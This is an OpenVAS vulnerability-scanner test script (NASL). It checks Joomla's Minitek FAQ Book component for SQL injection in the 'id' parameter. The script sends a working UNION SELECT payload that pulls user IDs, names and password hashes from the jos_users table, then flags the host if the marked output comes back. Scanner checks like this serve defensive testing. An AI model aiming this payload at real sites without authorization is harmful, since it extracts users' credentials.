##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_minitek_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla Minitek FAQ Book 'id' Parameter SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to manipulate SQL queries by
  injecting arbitrary SQL code.
  Impact Level: Application.";
tag_affected = "Joomla Minitek FAQ Book component version 1.3";
tag_insight = "The flaw is due to input passed via the 'id' parameter to 'index.php'
  (when 'option' is set to 'com_faqbook' and 'view' is set to 'category') is not
  properly sanitised before being used in a SQL query.";
tag_solution = "No solution or patch is available as of 20th June 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.minitek.gr/";
tag_summary = "This host is running Joomla Minitek FAQ Book component and is prone
  to SQL injection vulnerability.";

if(description)
{
  script_id(802106);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-20 15:22:27 +0200 (Mon, 20 Jun 2011)");
  script_bugtraq_id(48223);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Joomla Minitek FAQ Book 'id' Parameter SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/44943");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/102195/joomlafaqbook-sql.txt");
  script_xref(name : "URL" , value : "http://www.exploit-id.com/web-applications/joomla-component-minitek-faq-book-sql-injection");

  script_description(desc);
  script_summary("Check if Joomla Minitek FAQ Book component is vulnerable for SQL Injection attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

## Get the port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Get the application directiory
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

sndReq = http_get(item:string(joomlaDir, "/index.php"), port:joomlaPort);
rcvRes = http_send_recv(port:joomlaPort, data:sndReq);

## Extract the Cookie from the response to construct request
cookie = eregmatch(pattern:"Set-Cookie: ([a-zA-Z0-9=]+).*", string:rcvRes);

## Set the Cookie, If it does not come in the Response
if(!cookie[1]){
  cookie = "bce47a007c8b2cf96f79c7a0d154a9be=399e73298f66054c1a66858050b785bf";
}
else{
  cookie = cookie[1];
}

## Construct the Crafted request
sndReq = string("GET ", joomlaDir, "/index.php?option=com_faqbook&view=category" +
                "&id=-7+union+select+1,2,3,4,5,6,7,8,concat_ws(0x3a,0x4f70656e564153," +
                "id,password,0x4f70656e564153,name),10,11,12,13,14,15,16,17,18,19," +
                "20,21,22,23,24,25,26+from+jos_users--", " HTTP/1.1\r\n",
                "Host: ", get_host_name(), "\r\n",
                "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)" +
                            "Gecko/2009102704 Fedora/3.0.15-1.fc10 Firefox/3.0.15\r\n",
                "Cookie: ", cookie , "; path=/", "\r\n\r\n");

rcvRes = http_keepalive_send_recv(port:joomlaPort, data:sndReq);

if(egrep(string:rcvRes, pattern:"OpenVAS:[0-9]+:(.+):OpenVAS")){
  security_hole(joomlaPort);
}
